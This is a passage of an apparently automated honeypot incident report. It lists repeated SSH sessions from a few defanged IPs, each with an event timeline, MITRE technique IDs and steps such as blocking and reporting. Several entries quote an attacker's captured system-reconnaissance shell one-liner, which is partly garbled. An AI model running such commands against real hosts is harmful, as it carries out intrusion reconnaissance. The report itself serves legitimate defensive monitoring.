| `2026-03-11 14:17:13` | `cowrie.client.version` |
| `2026-03-11 14:17:13` | `cowrie.client.kex` |
| `2026-03-11 14:17:13` | `cowrie.login.success` |
| `2026-03-11 14:17:14` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:17:14` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:17:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf8320503621

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:18 |
| **Last Seen** | 2026-03-11 14:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:18:27` | `cowrie.session.connect` |
| `2026-03-11 14:18:27` | `cowrie.client.version` |
| `2026-03-11 14:18:27` | `cowrie.client.kex` |
| `2026-03-11 14:18:27` | `cowrie.login.success` |
| `2026-03-11 14:18:27` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:18:27` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:18:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd1e4fe12f64

| Field | Detail |
|---|---|
| **Source IP** | `139.59.4[.]130` |
| **First Seen** | 2026-03-11 14:18 |
| **Last Seen** | 2026-03-11 14:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:18:37` | `cowrie.session.connect` |
| `2026-03-11 14:18:38` | `cowrie.client.version` |
| `2026-03-11 14:18:38` | `cowrie.client.kex` |
| `2026-03-11 14:18:38` | `cowrie.login.success` |
| `2026-03-11 14:18:39` | `cowrie.session.params` |
| `2026-03-11 14:18:39` | `cowrie.command.input` |
| `2026-03-11 14:18:39` | `cowrie.command.input` |
| `2026-03-11 14:18:39` | `cowrie.command.input` |
| `2026-03-11 14:18:39` | `cowrie.command.input` |
| `2026-03-11 14:18:39` | `cowrie.log.closed` |
| `2026-03-11 14:18:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.4[.]130` to AbuseIPDB if not already reported
- [ ] Block `139.59.4[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c07ddde84505

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:19 |
| **Last Seen** | 2026-03-11 14:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:19:01` | `cowrie.session.connect` |
| `2026-03-11 14:19:01` | `cowrie.client.version` |
| `2026-03-11 14:19:01` | `cowrie.client.kex` |
| `2026-03-11 14:19:01` | `cowrie.login.success` |
| `2026-03-11 14:19:01` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:19:01` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7b438b92a0f

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:19 |
| **Last Seen** | 2026-03-11 14:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:19:19` | `cowrie.session.connect` |
| `2026-03-11 14:19:19` | `cowrie.client.version` |
| `2026-03-11 14:19:19` | `cowrie.client.kex` |
| `2026-03-11 14:19:19` | `cowrie.login.success` |
| `2026-03-11 14:19:19` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:19:19` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77bf1e2a2051

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:19 |
| **Last Seen** | 2026-03-11 14:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:19:22` | `cowrie.session.connect` |
| `2026-03-11 14:19:22` | `cowrie.client.version` |
| `2026-03-11 14:19:22` | `cowrie.client.kex` |
| `2026-03-11 14:19:22` | `cowrie.login.success` |
| `2026-03-11 14:19:23` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:19:23` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:19:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-057c90e6fb7e

| Field | Detail |
|---|---|
| **Source IP** | `139.59.4[.]130` |
| **First Seen** | 2026-03-11 14:19 |
| **Last Seen** | 2026-03-11 14:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:19:41` | `cowrie.session.connect` |
| `2026-03-11 14:19:41` | `cowrie.client.version` |
| `2026-03-11 14:19:41` | `cowrie.client.kex` |
| `2026-03-11 14:19:42` | `cowrie.login.success` |
| `2026-03-11 14:19:42` | `cowrie.session.params` |
| `2026-03-11 14:19:42` | `cowrie.command.input` |
| `2026-03-11 14:19:42` | `cowrie.command.input` |
| `2026-03-11 14:19:42` | `cowrie.command.input` |
| `2026-03-11 14:19:42` | `cowrie.command.input` |
| `2026-03-11 14:19:42` | `cowrie.log.closed` |
| `2026-03-11 14:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.4[.]130` to AbuseIPDB if not already reported
- [ ] Block `139.59.4[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-015796a4005e

| Field | Detail |
|---|---|
| **Source IP** | `139.59.4[.]130` |
| **First Seen** | 2026-03-11 14:20 |
| **Last Seen** | 2026-03-11 14:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:20:46` | `cowrie.session.connect` |
| `2026-03-11 14:20:46` | `cowrie.client.version` |
| `2026-03-11 14:20:46` | `cowrie.client.kex` |
| `2026-03-11 14:20:47` | `cowrie.login.success` |
| `2026-03-11 14:20:47` | `cowrie.session.params` |
| `2026-03-11 14:20:47` | `cowrie.command.input` |
| `2026-03-11 14:20:47` | `cowrie.command.input` |
| `2026-03-11 14:20:47` | `cowrie.command.input` |
| `2026-03-11 14:20:47` | `cowrie.command.input` |
| `2026-03-11 14:20:48` | `cowrie.log.closed` |
| `2026-03-11 14:20:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.4[.]130` to AbuseIPDB if not already reported
- [ ] Block `139.59.4[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb5942a73a5e

| Field | Detail |
|---|---|
| **Source IP** | `139.59.4[.]130` |
| **First Seen** | 2026-03-11 14:21 |
| **Last Seen** | 2026-03-11 14:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:21:49` | `cowrie.session.connect` |
| `2026-03-11 14:21:49` | `cowrie.client.version` |
| `2026-03-11 14:21:49` | `cowrie.client.kex` |
| `2026-03-11 14:21:50` | `cowrie.login.success` |
| `2026-03-11 14:21:50` | `cowrie.session.params` |
| `2026-03-11 14:21:50` | `cowrie.command.input` |
| `2026-03-11 14:21:50` | `cowrie.command.input` |
| `2026-03-11 14:21:50` | `cowrie.command.input` |
| `2026-03-11 14:21:50` | `cowrie.command.input` |
| `2026-03-11 14:21:50` | `cowrie.log.closed` |
| `2026-03-11 14:21:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.4[.]130` to AbuseIPDB if not already reported
- [ ] Block `139.59.4[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5f336a2e60e

| Field | Detail |
|---|---|
| **Source IP** | `192.109.200[.]220` |
| **First Seen** | 2026-03-11 14:22 |
| **Last Seen** | 2026-03-11 14:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:22:17` | `cowrie.session.connect` |
| `2026-03-11 14:22:17` | `cowrie.client.version` |
| `2026-03-11 14:22:17` | `cowrie.client.kex` |
| `2026-03-11 14:22:18` | `cowrie.login.success` |
| `2026-03-11 14:22:18` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:22:18` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:22:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.109.200[.]220` to AbuseIPDB if not already reported
- [ ] Block `192.109.200[.]220` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b50ddfaa4c0

| Field | Detail |
|---|---|
| **Source IP** | `139.59.4[.]130` |
| **First Seen** | 2026-03-11 14:23 |
| **Last Seen** | 2026-03-11 14:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:23:02` | `cowrie.session.connect` |
| `2026-03-11 14:23:02` | `cowrie.client.version` |
| `2026-03-11 14:23:02` | `cowrie.client.kex` |
| `2026-03-11 14:23:02` | `cowrie.login.success` |
| `2026-03-11 14:23:02` | `cowrie.session.params` |
| `2026-03-11 14:23:02` | `cowrie.command.input` |
| `2026-03-11 14:23:02` | `cowrie.command.input` |
| `2026-03-11 14:23:02` | `cowrie.command.input` |
| `2026-03-11 14:23:02` | `cowrie.command.input` |
| `2026-03-11 14:23:02` | `cowrie.log.closed` |
| `2026-03-11 14:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.4[.]130` to AbuseIPDB if not already reported
- [ ] Block `139.59.4[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0885da3170ad

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:23 |
| **Last Seen** | 2026-03-11 14:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:23:37` | `cowrie.session.connect` |
| `2026-03-11 14:23:37` | `cowrie.client.version` |
| `2026-03-11 14:23:37` | `cowrie.client.kex` |
| `2026-03-11 14:23:37` | `cowrie.login.success` |
| `2026-03-11 14:23:37` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:23:38` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:23:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfffcdb77a93

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:29 |
| **Last Seen** | 2026-03-11 14:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:29:57` | `cowrie.session.connect` |
| `2026-03-11 14:29:57` | `cowrie.client.version` |
| `2026-03-11 14:29:57` | `cowrie.client.kex` |
| `2026-03-11 14:29:57` | `cowrie.login.success` |
| `2026-03-11 14:29:57` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:29:57` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:29:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c34b8157716

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:30 |
| **Last Seen** | 2026-03-11 14:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:30:13` | `cowrie.session.connect` |
| `2026-03-11 14:30:13` | `cowrie.client.version` |
| `2026-03-11 14:30:14` | `cowrie.client.kex` |
| `2026-03-11 14:30:14` | `cowrie.login.success` |
| `2026-03-11 14:30:14` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:30:14` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:30:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b16650ced532

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:30 |
| **Last Seen** | 2026-03-11 14:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:30:19` | `cowrie.session.connect` |
| `2026-03-11 14:30:19` | `cowrie.client.version` |
| `2026-03-11 14:30:19` | `cowrie.client.kex` |
| `2026-03-11 14:30:19` | `cowrie.login.success` |
| `2026-03-11 14:30:19` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:30:20` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:30:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e75d83ce6423

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:30 |
| **Last Seen** | 2026-03-11 14:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:30:21` | `cowrie.session.connect` |
| `2026-03-11 14:30:21` | `cowrie.client.version` |
| `2026-03-11 14:30:21` | `cowrie.client.kex` |
| `2026-03-11 14:30:21` | `cowrie.login.success` |
| `2026-03-11 14:30:21` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:30:21` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e9a3021e545

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:31 |
| **Last Seen** | 2026-03-11 14:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:31:33` | `cowrie.session.connect` |
| `2026-03-11 14:31:33` | `cowrie.client.version` |
| `2026-03-11 14:31:33` | `cowrie.client.kex` |
| `2026-03-11 14:31:33` | `cowrie.login.success` |
| `2026-03-11 14:31:34` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:31:34` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:31:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0012098475df

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:40 |
| **Last Seen** | 2026-03-11 14:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:40:28` | `cowrie.session.connect` |
| `2026-03-11 14:40:28` | `cowrie.client.version` |
| `2026-03-11 14:40:28` | `cowrie.client.kex` |
| `2026-03-11 14:40:28` | `cowrie.login.success` |
| `2026-03-11 14:40:29` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:40:29` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:40:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a139a71918bc

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:40 |
| **Last Seen** | 2026-03-11 14:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:40:31` | `cowrie.session.connect` |
| `2026-03-11 14:40:31` | `cowrie.client.version` |
| `2026-03-11 14:40:31` | `cowrie.client.kex` |
| `2026-03-11 14:40:32` | `cowrie.login.success` |
| `2026-03-11 14:40:32` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:40:32` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:40:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-707d2a7c65c5

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:40 |
| **Last Seen** | 2026-03-11 14:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:40:36` | `cowrie.session.connect` |
| `2026-03-11 14:40:36` | `cowrie.client.version` |
| `2026-03-11 14:40:36` | `cowrie.client.kex` |
| `2026-03-11 14:40:37` | `cowrie.login.success` |
| `2026-03-11 14:40:37` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:40:37` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:40:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cff73ddf3d1c

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:40 |
| **Last Seen** | 2026-03-11 14:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:40:39` | `cowrie.session.connect` |
| `2026-03-11 14:40:39` | `cowrie.client.version` |
| `2026-03-11 14:40:40` | `cowrie.client.kex` |
| `2026-03-11 14:40:40` | `cowrie.login.success` |
| `2026-03-11 14:40:40` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:40:40` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:40:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c422f448e4e5

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:40 |
| **Last Seen** | 2026-03-11 14:40 |
| **Session Duration** | 1s |
